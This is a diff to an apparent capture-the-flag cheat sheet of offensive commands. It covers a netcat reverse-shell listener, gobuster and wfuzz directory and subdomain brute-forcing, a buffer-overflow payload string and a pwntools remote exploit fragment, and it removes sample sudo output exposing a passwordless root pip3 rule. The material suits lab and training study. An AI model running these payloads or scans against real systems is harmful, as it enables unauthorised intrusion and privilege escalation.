@@ -10,53 +10,32 @@ whoami
 ```bash
 sudo -l
 ```
-->
-```
-sudo: unable to resolve host domain: Temporary failure in name resolution
-Matching Defaults entries for low on domain:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
-User low may run the following commands on domain:
-    (root) NOPASSWD: /usr/bin/pip3
-```
-
 ## linux network
 ##### change hosts file
 ```bash
 sudo nano /etc/hosts
 ```
-
 ##### listen for reverse shell exploits
 ```bash
 nc -lvp 1234
 ```
-
 ##### scan for folders
-
-gobuster dir -u academy.htb -w /user/share/wordlists/dirbuster/directory-list-lowercase-2
+###### gobuster
 ```bash
-gobuster dir -u academy.htb -w /user/share/wordlists/dirbuster/directory-list-lowercase-2
+gobuster dir -u domain.com -w /home/dir/wordlist.txt
 ```
-
-wfuzz
-```bash
-gobuster dir -u academy.htb -w /user/share/wordlists/dirbuster/directory-list-lowercase-2
-```
-
 ##### scan for subdomains
 1) add main domain to hosts
 2) run wfuzz (here: hide results with code 301)
 ```bash
 wfuzz -c -w /home/path/subdomains.txt -u "http://domain.com" -H "Host: FUZZ.domain.com" -t 50 --hc 301
 ```
-
 ## buffer overflow
-
 ##### execute locally, string as text input
 ###### bash
 ```bash
 run <<< $(python -c 'print(188*"\x41" + "\xe2\x91\x04\x08" + "\x43" * 4 + "\xef\xbe\xad\xde"+ "\x0d\xd0\xde\xc0" )')
 ```
-
 ##### execute remotely, string as text input
 ###### bash
 ```bash
@@ -83,7 +62,6 @@ r.recvline()
 r.sendline(payload)
 r.interactive()
 ```
-
 
 ## python packages
 ##### build python package
